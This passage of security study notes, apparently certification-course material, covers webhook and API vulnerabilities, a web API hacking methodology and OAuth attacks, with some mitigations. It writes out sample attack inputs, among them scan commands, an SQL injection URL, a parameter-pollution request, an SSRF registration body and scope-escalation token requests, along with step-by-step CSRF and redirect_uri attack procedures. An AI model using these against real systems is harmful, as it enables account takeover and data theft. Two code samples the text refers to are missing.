			- Without proper verification, webhooks may accept and process unauthorized or manipulated data.
			- Mitigation: Implement hash-based message authentication code (HMAC) to verify the authenticity and integrity of received data.
		- Replay Attacks:
			- Attackers can capture a legitimate webhook request and resend it, potentially causing duplicate or unauthorized actions.
			- Mitigation: Include a timestamp in the webhook payload and validate it upon receipt to ensure the request is within an acceptable time window.
		- Unrestricted Sources:
			- By default, webhooks may accept data from any source, increasing the risk of processing malicious or unauthorized requests.
			- Mitigation: Implement IP whitelisting and mutual TLS (mTLS) to restrict webhook sources to trusted systems only.
		- Duplication and Forgery:
			- Webhook messages can be duplicated or forged, leading to data integrity issues and unintended actions.
			- Mitigation: Use mutual TLS and HMAC verification to ensure webhook messages are sent by authenticated sources and have not been tampered with.
		- Endpoint Configuration Errors:
			- Human errors in configuring webhook URLs may cause data to be sent to the wrong recipient, leading to data leaks.
			- Mitigation: Implement strict validation of webhook URLs, enforce allowlists, and conduct periodic audits of webhook configurations.
		- Forged Requests:
			- Attackers may craft and send malicious webhook requests to manipulate an application.
			- Mitigation: Use a shared secret token between the sender and receiver to authenticate webhook requests, accepting only requests that pass the verification process.
		- Unvalidated Redirects and Forwards:
			- Webhooks may be used to redirect users to malicious sites if URL redirection is not properly validated.
			- Mitigation: Restrict URL redirections to a whitelist of trusted domains and validate any redirect URLs before processing them.
	- API Vulnerabilities:
		- Modern web applications and SaaS platforms rely heavily on APIs due to their extensive features, but API security is often focused solely on technical aspects. Poor management of API permissions, flaws in business logic, and exposure of application logic and sensitive data—such as personally identifiable information (PII)—significantly increase the attack surface. Attackers exploit these vulnerabilities to launch attacks such as Denial of Service (DoS) and code injection attacks.
		- Common API Vulnerabilities:
			- Enumerated Resources:
				- Design flaws can lead to severe vulnerabilities, exposing sensitive information through unauthenticated public APIs.
				- Attackers can easily guess user IDs, leading to unauthorized access to user data.
			- Sharing Resources via Unsigned URLs:
				- APIs often return URLs to hypermedia resources (e.g., images, audio, or video files), making them vulnerable to hotlinking (unauthorized use by other websites).
				- This can cause issues such as resource strain and poor analytics tracking, and may also be exploited by attackers.
				- Mitigation: Use signed URLs to enforce policies like rate limiting, auto-expiration, and scoped sharing.
			- Vulnerabilities in Third-Party Libraries:
				- Developers often use third-party libraries with open-source licenses.
				- Failing to apply regular updates and security patches can leave APIs vulnerable to known exploits.
			- Improper Use of CORS (Cross-Origin Resource Sharing):
				- CORS enables web browsers to perform cross-domain requests, but misconfigured CORS settings can introduce security flaws.
				- Allowing all origins (using Access-Control-Allow-Origin: *) on private APIs can lead to hotlinking and unauthorized access.
			- Code Injections:
				- Unsanitized input can allow attackers to inject malicious code through techniques such as:
					- SQL Injection (SQLi) – Injecting SQL queries to manipulate databases.
					- Cross-Site Scripting (XSS) – Injecting scripts to steal user session cookies or credentials.
				- Mitigation: Proper input validation and sanitization help prevent these attacks.
			- RBAC Privilege Escalation:
				- Role-Based Access Control (RBAC) vulnerabilities occur when endpoint changes are made without proper validation.
				- Attackers can escalate privileges and gain unauthorized access to sensitive user data.
			- No ABAC Validation:
				- Attribute-Based Access Control (ABAC) prevents unauthorized access by enforcing policies based on user attributes.
				- Lack of ABAC validation allows attackers to access restricted API objects or perform unauthorized actions (view, update, or delete).
			- Business Logic Flaws:
				- Many APIs contain flaws in business logic, allowing attackers to manipulate workflows for malicious purposes.
				- These vulnerabilities are difficult to detect because they exploit legitimate API functions in unintended ways.
	- Web API Hacking Methodology:
		- In recent years, the use of web-based APIs has grown significantly, supporting a wide range of devices, including mobile devices and IoT devices. These devices frequently communicate with backend web servers through APIs. However, in an effort to make APIs more user-friendly, developers often take security shortcuts, leaving online web services vulnerable to various attacks.
		- Attackers exploit these security weaknesses by identifying vulnerabilities in APIs using various techniques. To hack an API, attackers must first determine its technologies, security standards, and attack surface before launching an attack.
		- Phases of Web API Hacking:
			- Identify the Target: Gather information about the API, including endpoints, documentation, and authentication mechanisms.
			- Detect Security Standards: Identify the security measures in place, such as authentication methods (OAuth, JWT, API keys) and encryption protocols.
			- Identify the Attack Surface: Analyze the API for potential vulnerabilities, including broken authentication, improper access controls, and data exposure.
			- Launch Attacks: Exploit identified weaknesses using techniques such as SQL injection, API fuzzing, and privilege escalation.
		- Identifying the Target:
			- Before attempting to hack an API, an attacker must first identify the target and its perimeter by analyzing how the API communicates and processes data.
			- HTTP Protocol Analysis:
				- APIs, such as SOAP and REST, primarily use the HTTP protocol for communication. Since HTTP is a text-based protocol, header information is transmitted in a readable format, making it susceptible to manipulation.
				- For example, HTTP request and response headers are often sent in plaintext, allowing attackers to intercept, analyze, and modify them to gain insights into the API’s structure and vulnerabilities.
			- Message Format Examination:
				- API messages transmitted over the web typically use structured formats, such as:
					- JSON (JavaScript Object Notation) for REST APIs
					- XML (Extensible Markup Language) for SOAP APIs
				- If these formats are misconfigured or improperly validated, they can introduce vulnerabilities.
				- Because these formats are human-readable, attackers can easily intercept, modify, and manipulate API messages to uncover security weaknesses and gain deeper access to the system.
		- Detecting Security Standards:
			- While APIs claim to be secure by incorporating security standards such as OAuth and SSL, they often contain vulnerabilities that attackers can exploit.
			- Authentication and Authorization Standards:
				- APIs, such as SOAP and REST, implement various authentication and authorization mechanisms, including:
					- OpenID Connect
					- SAML (Security Assertion Markup Language)
					- OAuth 1.X and 2.X
					- WS-Security
				- If these authentication mechanisms are misconfigured or improperly implemented, attackers can exploit them to gain unauthorized access to sensitive data.
			- SSL and Transport-Level Security:
				- SSL (Secure Sockets Layer) is commonly used to provide encryption and integrity for API messages, ensuring confidentiality during transmission.
				- However, in many API implementations, only sensitive user data (e.g., credit card details) is encrypted, while other information remains in plaintext, making it vulnerable to interception and tampering.
			- Exploiting Weak Security Configurations:
				- If security standards are not properly enforced, attackers can identify and exploit gaps in API security.
				- For example, an attacker may capture and reuse a session token to access a legitimate user's account information if the API does not encrypt or properly validate tokens.
		- API Enumeration:
			- Kiterunner is an advanced API scanning and content discovery tool designed specifically for modern web applications that heavily depend on APIs. Unlike conventional tools that brute-force directories, Kiterunner goes further by understanding complex API endpoint structures through context-aware scanning.
			- Attackers can leverage Kiterunner to scan API endpoints for vulnerabilities. It supports scanning single targets, multiple targets, or entire target lists in one go.
			- Common API Scanning Methods using Kiterunner:
				- Scanning a Single Target: kr scan https://target.com:8443/ -w routes.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
				- Scanning a Single Target with Both HTTP & HTTPS: kr scan target.com -w routes.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
				- Scanning a List of Targets: kr scan targets.txt -w routes.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
		- Identify the Attack Surface:
			- After selecting the target API and analyzing its security implementations, an attacker must identify the attack surface to launch an attack. Identifying an attack surface is straightforward for UI-based applications, as input fields are visible on web pages. However, for APIs, there are no built-in UI fields—only API endpoints are exposed. To determine an API’s attack surface, attackers must analyze its endpoints, messages, parameters, and behavior.
			- Techniques for Identifying the Attack Surface of Target API:
				- API Metadata Vulnerabilities: API metadata reveals a significant amount of technical information, such as paths, parameters, and message formats, which can aid in an attack. REST APIs use metadata formats like Swagger, RAML, API-Blueprint, and I/O Docs, while SOAP APIs rely on WSDL/XML-Schema. For example, the following Swagger code snippet may expose sensitive technical details. Attackers can exploit vulnerabilities in these definitions to execute various API attacks.
				- API Discovery: If an API lacks metadata, attackers can monitor and record communications between the API and an existing client to identify the attack surface. For example, an attacker may use a mobile app that interacts with the target API, set up a local proxy to capture traffic, and configure the mobile device to route requests through this proxy. Automated tools can then generate metadata from the recorded traffic, helping attackers map out the API structure.
				- Brute Force: If the above techniques fail, attackers may attempt brute-force methods to discover API paths, arguments, and other components. Common API paths used by developers include /api, /api/v2, and /apis.json. Additionally, some APIs, such as hypermedia APIs, expose links and parameters in API responses, which can further assist attackers in identifying the attack surface.
			- Analyzing Web API Requests and Responses:
				- Attackers can use tools like Postman and ReqBin to intercept and analyze target web APIs, websites, and web services.
				- Postman: Postman enables attackers to capture API traffic, including requests, responses, and cookies, using its built-in proxy. The Postman Interceptor can intercept requests and responses, while the Postman proxy operates within the application, supporting both HTTP and HTTPS traffic.
		- Launch Attacks:
			- After identifying the target API, analyzing message formats and security standards, and determining the attack surface, attackers launch various attacks to steal sensitive information such as credit card details and credentials.
			- Common API Attacks:
				- Fuzzing:
					- Attackers use fuzzing to repeatedly send random inputs to the target API, triggering error messages that may expose critical information. To perform fuzzing, they use automated scripts that send numerous requests with varying input parameter combinations. Tools such as Fuzzapi are commonly used to execute fuzzing attacks on APIs.
				- Invalid Input Attacks:
					- In some cases, fuzzing may be difficult due to the API’s structure. In such situations, attackers input invalid data, such as sending text instead of numbers, numbers instead of text, exceeding the expected character limit, or inserting null characters. These tactics exploit unexpected system behavior and error messages to extract sensitive information. Additionally, attackers manipulate HTTP headers and values to target both API logic and the HTTP protocol.
				- Malicious Input Attacks:
					- In the attack discussed above, attackers attempt to retrieve sensitive information by exploiting unexpected system behavior or error messages. A more dangerous variation involves injecting malicious input directly to target both the API and its hosting infrastructure. To execute this attack, attackers employ malicious message parsers using XML.
					- When the above-mentioned code is processed by a vulnerable or misconfigured XML parser, it attempts to expand the lol9 entity, leading to a memory-out-of-bounds error. This can either crash the target server completely or render it vulnerable to further attacks. Another method attackers use is uploading malicious script files, such as a shell script instead of a PDF document. If executed, this malicious script can bypass security mechanisms on the server or propagate to other users accessing the API. Using this technique, attackers attempt to extract information related to the underlying filesystem.
				- Injection Attacks:
					- Similar to traditional web applications, APIs are also vulnerable to various injection attacks. For example, consider the following normal URL: http://billpay.com/api/v1/cust/459
					- For this URL, the API retrieves customer details based on the customer ID (459) from the database using the following SQL query: SELECT * FROM Customers WHERE custID = '459'
					- Now, assume an attacker injects malicious input: http://billpay.com/api/v1/cust/'%20or%20'1'='1
					- This results in the following SQL query: SELECT * FROM Customers WHERE custID = '' OR '1' = '1'
					- Since the condition '1' = '1' always evaluates to true, the query returns details of all customers in the database. Using this information, an attacker may delete or modify data or exploit customer information for further malicious activities on the database server.
					- API injection attacks are not limited to SQL but can also be performed using JSON, JavaScript, XPath, XSLT, and other technologies requiring parsers or processors for execution.
					- Similar to injection attacks, web APIs are also vulnerable to Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) attacks.
				- Exploiting Insecure Configurations:
					- Insecure SSL Configuration: Vulnerabilities in SSL configurations can allow attackers to perform Man-in-the-Middle (MITM) attacks. For example, using self-signed SSL certificates for secure API access may expose the system to interception. An attacker can sniff traffic between an API and a client, manipulate the client-side certificate, and monitor or alter encrypted communications between the client and the API.
					- Insecure Direct Object References (IDOR): APIs often use direct object references as arguments for API calls, but access controls are not always properly enforced. If a user does not have explicit access restrictions on certain objects, attackers can exploit this vulnerability by analyzing API metadata, identifying parameters, and testing all possible parameter values to access unauthorized data.
					- Insecure Session/Authentication Handling: Weak session and authentication handling can make APIs vulnerable to attacks. Issues such as session token reuse, predictable (sequential) session tokens, long session timeouts, unencrypted session tokens, or tokens embedded in URLs can allow attackers to hijack client sessions. Once a session is compromised, attackers can steal or manipulate messages exchanged between the client and the API, leading to data breaches or unauthorized actions.
				- Login/Credential Stuffing Attacks:
					- Attackers often target login and authentication systems because these attacks are difficult to detect and mitigate using typical API security solutions. Credential stuffing exploits users' tendency to reuse passwords across multiple platforms. Since many users use the same passwords for different web services, attackers leverage stolen credentials from one compromised account to gain unauthorized access to others.
					- Unlike brute-force attacks, credential stuffing does not involve guessing passwords. Instead, attackers use automated tools such as Sentry MBA and PhantomJS to systematically test large sets of previously stolen username-password pairs. These attacks can also disrupt API-based services by preventing legitimate users from signing in, thereby degrading the user experience and the functionality of front-facing APIs.
					- Attackers often deploy bots to attempt multiple logins using stolen credentials from past breaches or leaked databases. They flood servers with login requests until they successfully gain access. Once inside, attackers can take control of user accounts, conduct unauthorized transactions, and execute fraudulent online activities.
				- API DDoS Attacks:
					- A Distributed Denial-of-Service (DDoS) attack overwhelms an API with a massive volume of traffic from multiple infected devices (botnet), causing delays for legitimate users. While rate-limiting measures are often in place to prevent server crashes, they may not be sufficient to stop service delays, ultimately degrading the API’s user experience.
					- Attackers commonly use botnets designed to stay within API rate limits, increasing the likelihood of a successful attack. These malicious requests, mixed with legitimate traffic, can bypass API security management systems, load balancers, and other defenses. Not all API DDoS attacks are purely volumetric; some exploit API vulnerabilities to disrupt services. For example, an attacker with API access may consume excessive CPU and memory resources, prolonging service delays and impairing overall API functionality.
				- Authorization Attacks on APIs: OAuth Attacks:
					- According to Auth0, OAuth is an authorization protocol that allows a user to grant limited access to their resources on one site to another site without exposing their credentials. OAuth provides authorization flows for various computing devices and applications, enabling users to connect different applications to access required information.
					- Key Actors in the OAuth Process:
						- Resource Owner: Also known as the user, the resource owner grants permission to an application to access their account. This access is limited or conditional, such as providing only read or write permissions.
						- Authorization Server / Resource Server (API): The resource server hosts the secured user account, while the authorization server validates the user’s identity and issues an access token to the application.
						- Client/Application: The client is the application that seeks access to the user’s account. To gain access, the user must authorize the application, and the API must validate the authorization.
					- Steps Involved in the Authorization Code Grant:
						- The authorization code grant consists of four steps, during which attackers can exploit vulnerabilities to perform various authorization attacks on the API.
						- Initiating the Authorization Process:
							- The user sends a GET request to the client via the user agent to start the authorization process.
							- This action is typically triggered by clicking a "Login with" or "Connect" button on the client’s site.
						- Redirection to the Authorization Server:
							- The client redirects the user agent to the authorization server with the following parameters:
							- response_type: Specifies the type of response expected (e.g., code for an authorization code).
							- client_id: The unique identifier assigned to the client application.
							- redirect_uri: The URI where the authorization server redirects the user agent after authorization.
							- scope: Defines the level of access requested by the application.
							- state: A randomly generated opaque value used for security purposes, such as preventing CSRF attacks and maintaining the request state.
						- Authorization and Redirection:
							- Once the user is authenticated and grants access, the authorization server redirects the user agent to the specified redirect_uri.
							- The response includes the following parameters:
								- code: The authorization code issued to the client.
								- state: The same value sent in the initial request, ensuring integrity.
						- Requesting the Access Token:
							- The client exchanges the authorization code for an access token by sending a request with the following parameters:
							- grant_type: Specifies the grant type, set to authorization_code.
							- code: The authorization code received in the previous step.
							- redirect_uri: The same URI used in the initial request to ensure consistency.
					- OAuth Attacks:
						- Various OAuth attacks are carried out by manipulating the requests mentioned above. One such attack targets the "Connect" request.
						- Attack on the ‘Connect’ Request:
							- Many websites allow users to log in via OAuth using services like LinkedIn, Instagram, or Twitter. An attacker can exploit this process when a user clicks the "Login with" or "Connect" button. By doing so, the attacker can gain unauthorized access to the victim’s account on the client-side by linking their own account to the provider’s website.
							- Steps to Perform an Attack on the ‘Connect’ Request:
								- Creating a Fake Account:
									- The attacker registers a fake account on the provider’s website.
								- Initiating the ‘Connect’ Operation:
									- The attacker attempts to connect their fake account to the client application using OAuth.
									- However, they intercept and halt the authorization server’s redirection process.
									- This means the attacker grants the client access to their fake account on the provider without the client being aware of it.
								- Crafting a Malicious Web Page:
									- The attacker sets up a webpage with the following actions:
									- CSRF attack #1: Forces the victim to log out of the provider’s website.
									- CSRF attack #2: Forces the victim to log back in—but with the attacker’s fake account credentials.
									- Request Spoofing: Modifies the initial OAuth request to connect the attacker’s provider account with the client.
									- This is typically done using an <iframe> to execute the request invisibly, ensuring the victim is unaware.
								- Executing the Attack:
									- When the victim unknowingly visits the attacker’s webpage:
										- They are logged out of the provider.
										- They are tricked into logging in using the attacker’s fake account.
										- The victim’s account on the client is then linked to the attacker’s fake account on the provider.
									- Since the attacker has already granted access, the victim does not receive a permission prompt.
								- Exploiting the Victim’s Account:
									- The attacker can now log into the victim’s account on the client application using their fake provider account.
						- Attack on redirect_uri:
							- When registering a client, the domain is typically specified, and only predefined redirect_uri values within that domain are allowed. However, if an attacker identifies a vulnerability such as Cross-Site Scripting (XSS) on a page within the client domain, they can exploit it to capture the authorization code.
							- Steps to Perform an Attack on redirect_uri:
								- The attacker finds a vulnerable page on the client domain, e.g., https://xyz.com/vuln.
								- They inject malicious JavaScript into this page, enabling it to capture and send URLs (including parameters and fragments) to the attacker.
								- The attacker creates a phishing page that tricks the user into clicking a malicious link: https://provider.com/oauth/authorize?client_id=CLIENTID&response_type=auth_code&redirect_uri=https%3A%2F%2Fxyz.com%2Fvuln
								- When the victim clicks the link, the user agent is redirected to: https://xyz.com/vuln?code=CODE
								- The vulnerable page extracts and exfiltrates the authorization code to the attacker.
								- The attacker then exchanges this code for an access token using a legitimate redirect URI, such as: https://xyz.com/oauth/callback?code=CODE
						- CSRF on Authorization Response:
							- A Cross-Site Request Forgery (CSRF) attack can link the victim’s account on the client-side to the attacker’s fake account on the provider. This attack takes advantage of a third-party authorization request during the authorization code grant process.
							- Steps to Perform CSRF on Authorization Response:
								- The attacker creates a fake account on the provider.
								- The attacker starts a "Connect" operation with the client using their fake account.
								- They intercept and halt the authorization server’s redirection, storing the authorization code without informing the client.
								- The attacker tricks the victim into sending a request to: https://xyz.com/<provider>/login?code=Auth_Code
									- This can be done using a malicious link embedded within an <img> or <script> tag.
								- When the victim logs into the client, the attacker’s fake account is linked to the victim’s account.
								- Now, the attacker can log into the victim’s client account simply by signing in with their fake account on the provider.
						- Access Token Reuse:
							- OAuth requires unique access tokens for different clients, ensuring that each token is tied to a specific scope and expiration time. However, some clients allow access tokens issued to one client to be used by another, leading to security vulnerabilities.
							- Steps to Reuse Access Tokens:
								- The attacker creates a legitimate OAuth client application (e.g., "ClientA") and registers it with a provider.
								- They trick a victim into logging into ClientA, gaining unauthorized access to their access token.
								- If the victim also uses another client, ClientB, which employs an implicit grant flow, the authorization server redirects the user agent to: https://clientB.com/callback#access_token=ACCESSTOKEN
								- The attacker uses the stolen access token from ClientA to access ClientB.
								- Since ClientB does not properly validate the token’s intended recipient, the attacker is authenticated as a legitimate user.
							- Impact: The same access token can be exploited across multiple clients using the implicit grant flow, allowing attackers to impersonate victims across services.
						- SSRF Using the Dynamic Client Registration Endpoint:
							- During black-box testing of an OAuth server, hidden URLs—such as the Dynamic Client Registration endpoint—may go undetected. These URLs are typically mapped to /register and serve as special registration endpoints. Attackers can exploit them to perform Server-Side Request Forgery (SSRF) by injecting malicious URLs into specific request parameters.
							- Example of an SSRF Attack via POST Request:
								POST /connect/register HTTP/1.1
								Content-Type: application/json
								Host: server.certifiedhacker.com
								Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ ...
								{
								"application_type": "web app",
								"redirect_uris": ["https://client.certifiedhacker.com/callback"],
								"client_name": "Sample Test",
								"logo_uri": "https://client.certifiedhacker.com/logo.png",
								"subject_type": "pairwise",
								"sector_identifier_uri": "https://certifiedhacker.com/rdrct_uris.json",
								"token_endpoint_auth_method": "client_secret_basic",
								"jwks_uri": "https://client.certifiedhacker.com/public_keys.jwks",
								"contacts": ["hacker@certifiedhacker.com"],
								"request_uris": ["https://client.certifiedhacker.com/rf.txt"]
								}
							- In the above request, several URL parameters can be exploited for SSRF attacks:
								- logo_uri:
									- After client registration, the server assigns a client_id and fetches the logo from the logo_uri.
									- If the server automatically retrieves this logo, an SSRF attack may occur, allowing an attacker to make the server request arbitrary URLs.
								- jwks_uri:
									- The JSON Web Key Set (JWKS) is critical for authenticating tokens.
									- If an attacker registers a malicious URL in the jwks_uri parameter, the server may request a fake JWKS, compromising authentication.
									- This could allow the attacker to obtain authorization codes for multiple users.
								- request_uris:
									- This parameter contains an array of URLs used when authorizing an endpoint.
									- The attacker can inject a malicious URL into request_uris, leading to SSRF exploitation.
							- Impact of SSRF Attacks:
								- Can be used to scan internal networks and expose internal services.
								- May allow exfiltration of sensitive data by making unauthorized server requests.
								- Can bypass access controls to perform privilege escalation attacks.
						- WebFinger User Enumeration:
							- WebFinger is a standard protocol used to retrieve user information via GET requests. In OAuth authorization, the endpoint /.well-known/webfinger is used to validate whether a username exists on the server.
							- Attackers can exploit this functionality for user enumeration by sending requests with non-existent usernames.
							- How the Attack Works:
								- The attacker sends a WebFinger request to the OAuth provider:
									GET /.well-known/webfinger?resource=acct:anonymous@provider.com HTTP/1.1
									Host: provider.com
								- If the username does not exist, the server may respond with an error, indicating that the account is unavailable.
								- If the username does exist, the response may contain a valid profile URL, such as:
									{
									"subject": "acct:anonymous@provider.com",
									"links": [
										{
										"rel": "http://host/user",
										"href": "http://provider.com/user/anonymous"
										}
									]
									}
								- The attacker can infer whether an account exists based on differences in responses, leading to user enumeration.
							- Impact of WebFinger Enumeration:
								Allows attackers to identify valid usernames, which can be used in credential stuffing and brute-force attacks.
								Can be exploited to gather intelligence on registered users.
								May expose sensitive user information if improperly configured.
						- Exploiting Flawed Scope Validation:
							- Attackers can exploit flawed scope validation in OAuth implementations to escalate privileges and gain unauthorized access to additional user data. This attack occurs when an OAuth service provider fails to properly validate scope parameters in authorization requests, allowing an attacker to modify or extend the granted permissions.
							- The scope parameter in OAuth defines the level of access granted to the client application. It can either be:
								- Dynamically defined by the client, or
								- Based on standardized scope entities, such as OpenID Connect.
							- If an attacker can manipulate this scope parameter, they can escalate privileges and exfiltrate additional user data.
							- Steps to Exploit Flawed Scope Validation:
								- Attackers typically use two grant types to exploit this vulnerability:
								- Exploiting Scope Validation via Authorization Code Grant Type:
									- Attacker Registers a Malicious Client Application:
										- The attacker registers an OAuth service that the targeted resource owner uses.
										- Example: The attacker creates a malicious application at https://xyz.com.
									- Victim Opens the Malicious Client Application:
										- The attacker tricks the victim into accessing their OAuth-based application.
									- Attacker Requests an Authorization Code with Limited Scope:
										- The attacker sends an authorization request to the OAuth service provider to obtain the victim’s email address using the OpenID email scope.
										- Example request:
											https://provider.com/oauth/authorize?
											response_type=code&
											client_id=attacker-client-id&
											redirect_uri=https://xyz.com/callback&
											scope=openid email
									- Victim Grants Authorization:
										- The victim unknowingly approves the request, and the OAuth provider returns an authorization code.
									- Attacker Escalates Scope via Token Request:
										- Instead of using the authorization code as intended, the attacker modifies the scope parameter in the token request:
											POST /oauth/token HTTP/1.1
											Host: provider.com
											Content-Type: application/x-www-form-urlencoded

											client_id=12345&
											client_secret=SECRET&
											redirect_uri=https://xyz.com/callback&
											grant_type=authorization_code&
											code=a1b2c3d4e5f6g7h8&
											scope=openid email profile
										- The attacker adds the "profile" scope, which was not originally requested.
									- OAuth Server Returns an Expanded Access Token:
										- If the OAuth service provider does not properly validate scope parameters, it approves the request and returns a new access token with the expanded scope:
											{
											"access_token": "z0y9x8w7v6u5",
											"token_type": "Bearer",
											"expires_in": 3600,
											"scope": "openid email profile"
											}
										- The attacker now has access to additional user data that was not originally requested or approved by the user.
									- Attacker Uses the Token to Make API Calls:
										- With the escalated access token, the attacker retrieves extra user information that was not originally granted.
								- Exploiting Scope Validation via Implicit Grant Type:
									- Attacker Targets a Vulnerable Client Application:
        								- The attacker identifies a client application that uses the implicit grant type to obtain access tokens via an open browser.
        								- Example vulnerable endpoint: https://xyz.com/vuln.
									- Attacker Waits for Token Issuance:
        								- The victim interacts with the vulnerable client application, which requests an access token from the OAuth service provider.
        								- Upon user approval, an access token is issued and returned in the URL fragment: https://xyz.com/callback#access_token=ACCESSTOKEN&expires_in=3600&scope=openid email
									- Attacker Extracts the Access Token:
										- The attacker intercepts the access token from the client application using browser-based attacks (e.g., XSS, Man-in-the-Middle (MITM), or Referrer Leaks).
									- Attacker Uses the Token to Request Additional Scope:
										- The attacker modifies the request to the OAuth provider by adding an expanded scope: https://provider.com/userinfo?access_token=ACCESSTOKEN&scope=openid email profile
									- OAuth Service Provider Fails to Validate Scope Parameter:
										- If the OAuth provider does not revalidate the scope associated with the access token, it returns additional user data.
									- Attacker Gains Unauthorized Access:
										- The attacker harvests sensitive user data (e.g., profile information, contacts, or even financial data).
										- The attack remains undetected until the OAuth server properly verifies the scope parameter.
				- Reverse Engineering:
					- Viewing APIs from a developer’s perspective can be flawed because it only verifies whether an API is functioning as intended. However, once deployed for end-user interaction, it may not perform as expected in a real-world environment. Attackers often exploit this by reverse-engineering the API, invoking its functions in reverse order to uncover vulnerabilities that may not be apparent during regular use.
					- For instance, consider an order placed using an account that has already been used for a previous booking. The typical order flow might look like this:
						- Order is placed
						- Order is linked to the account
						- Order is accepted
					- Attackers can manipulate this sequence during reverse engineering. If they manage to force the acceptance mechanism to execute in reverse order, they may disrupt the internal API that connects orders to accounts. This could potentially crash the API, exposing user account details through unintended browser responses.
				- User Spoofing:
					- User spoofing involves concealing one’s original identity and masquerading as a legitimate user or privileged entity. In most cases, attackers exploit stolen credentials or leaked information obtained through phishing to gain unauthorized access.
					- Once inside the system, attackers may escalate their privileges by redirecting API requests to different endpoints, injecting malicious code disguised as text, or overloading the API with excessive data, leading to a buffer overflow. This can grant them unauthorized access to sensitive data or system functions.
				- Man-in-the-Middle (MITM) Attacks:
					- In a MITM attack, attackers intercept communications between an API and the server, either by eavesdropping on the data exchange or by posing as a legitimate server. The goal is to manipulate the API interaction, often by injecting fake links that appear authentic.
					- Attackers may achieve this through domain squatting or by mimicking API resource locations. For example, if a legitimate API request is made to: api.io/media/function
					- An attacker could create a fraudulent version, such as: apo.io/media/function
					- A minor typographical difference can deceive users into unknowingly providing sensitive information to an attacker-controlled server.
				- Session Replay Attacks:
					- Session replay attacks target websites and applications that store session information. Attackers capture session IDs and replay them to the server, tricking it into treating the request as if it were from the original user.
					- By rewinding session timestamps and resubmitting requests, attackers can gain unauthorized access to user accounts, retrieve confidential data, or perform unauthorized transactions, all while bypassing authentication measures.
				- Social Engineering:
					- While not a direct API attack, social engineering tactics can be used to exploit API security. These attacks rely on manipulating users rather than exploiting technical vulnerabilities.
					- Phishing is a common technique where attackers send deceptive emails containing malicious links that prompt users to reset or validate security credentials. A more advanced variant, spear-phishing, uses personalized data to create highly convincing messages that trick users into interacting with fake API endpoints.
					- If a user unknowingly enters their credentials on a fraudulent site, attackers can capture this information and use it to:
						- Modify account details
						- Conduct unauthorized transactions
						- Launch further attacks using the stolen credentials
		- REST API Vulnerability Scanning:
			- REST API vulnerabilities pose the same risks as security issues in web applications and websites. These risks include critical data theft, data tampering, and other malicious activities. Conducting thorough vulnerability scans on REST APIs can help identify weaknesses that attackers might exploit. Various tools, such as Astra, Fuzzapi, W3af, and AppSpider, are commonly used for REST API vulnerability scanning.
			- REST API Vulnerability Scanning Tools:
				- Astra:
					- Attackers use the Astra tool to detect and exploit vulnerabilities in REST APIs. Astra can discover and test authentication mechanisms such as login and logout, making it easy to integrate into CI/CD pipelines. It accepts API collections as input values, enabling comprehensive REST API scans. Astra helps identify vulnerabilities such as:
						- Cross-Site Scripting (XSS)
						- SQL Injection
						- Information Leakage
						- Cross-Site Request Forgery (CSRF)
						- Broken Authentication and Session Management
						- JWT Attacks
						- Blind XXE Injection
						- CRLF Injection
						- CORS Misconfiguration
						- Rate Limiting Issues
					- By leveraging Astra, attackers can systematically uncover and exploit security flaws in REST APIs, emphasizing the importance of proactive security measures.
				- Fuzzapi (github.com)
				- w3af (github.com)
				- AppSpider (www.rapid7.com)
				- Vooki (www.vegabird.com)
				- OWASP ZAP (www.zaproxy.org)
		- Bypassing IDOR via Parameter Pollution:
			- Insecure Direct Object Reference (IDOR) is a vulnerability that arises when developers expose references to internal data objects such as database keys, directories, and files. Attackers can exploit this by modifying these references to gain unauthorized access to sensitive data. One way to bypass IDOR protection is through parameter pollution, where the attacker provides the same parameter name multiple times with different values.
			- For instance, assume that the victim’s user_id is 321. An attacker might change this value to 654 (another user's user_id) to check for IDOR vulnerabilities. If the application is properly secured, it should return a "401 Unauthorized" error. However, if the application is vulnerable to parameter pollution, the attacker can manipulate the request by including multiple user_id parameters—one with the victim's user_id and another with their own.
			- Example:
				- Consider the following legitimate request: GET api.xyz.com/profile/user_id=321
				- An attacker manipulates this request using parameter pollution: GET api.xyz.com/profile/user_id=654&user_id=321
				- When this request reaches the REST API endpoint, the application may process only the first user_id parameter (654), granting the attacker unauthorized access to the victim’s profile.
			- Exploitation and Impact:
				- Attackers often use tools like Burp Suite to intercept and modify API requests. By injecting both their own user_id and the victim’s user_id, they can retrieve sensitive data and compromise user accounts. This technique can also affect the application's functionality, as multiple parameters could be vulnerable to manipulation.
				- To prevent such attacks, developers should implement proper input validation, enforce strict authentication and authorization checks, and avoid relying on the first occurrence of a parameter when handling API requests.
	- Secure API Architecture:
		- APIs facilitate communication between applications over the web and are widely used due to their advanced capabilities and existing infrastructure. However, they are vulnerable to cyberattacks due to security flaws from poor programming practices and their inherent transparency. To protect APIs, organizations must implement a secure architecture, enforce security policies, and apply effective mitigation strategies.
		- A secure API architecture relies on an API gateway with firewalls to control traffic and detect threats. Security is enforced by separating API implementation from security, ensuring distinct roles for developers and security professionals. Developers focus on API design and integration, while security professionals handle identity management, threat detection, and data protection.
		- API security professionals use advanced tools, including API gateways—hardened physical or virtual appliances installed in an organization's demilitarized zone (DMZ). These gateways act as secure proxies between internal applications and the external internet, providing security controls such as access management, threat detection, authentication, encryption, and rate limiting.
		- Implementing Layered Security in an API:
			- APIs are commonly used by businesses to connect different services and transfer data. However, attackers often exploit API vulnerabilities, such as broken authentication and security misconfigurations, for malicious purposes. Exposed APIs can lead to major breaches of sensitive data, such as personally identifiable information (PII). To mitigate these risks, developers must implement multiple layers of security to prevent API exposure and data breaches.
			- Consider an API that fetches a company's transaction data. Developers and security experts can implement the following layered security approach:
				- Layer One: The API must validate the user to ensure that the entity is authorized by the company. If the user is not authorized, the API should return an exception, such as "Company Not Found." This helps developers identify unauthorized access attempts and prevent data exposure.
				- Layer Two: In this layer, middleware is used to generate a query plan before calling the data layer. The database layer must apply a filter for the company ID before processing the request. If this filter is absent, the API should return a security exception, such as "Unsafe Data Query," to prevent unauthorized access.
				- Layer Three: An SQL join should be used to query the database via the data link layer based on API calls. This ensures that all queries match the user responsible for the API request. Additionally, it verifies the user context against the data stored in the SQL layer to prevent unauthorized access to other users' data.
				- Layer Four: This layer introduces a mapper that converts database records into user-visible models. The mapper ensures that sensitive data, such as implementation details, is not exposed to the public or customers.
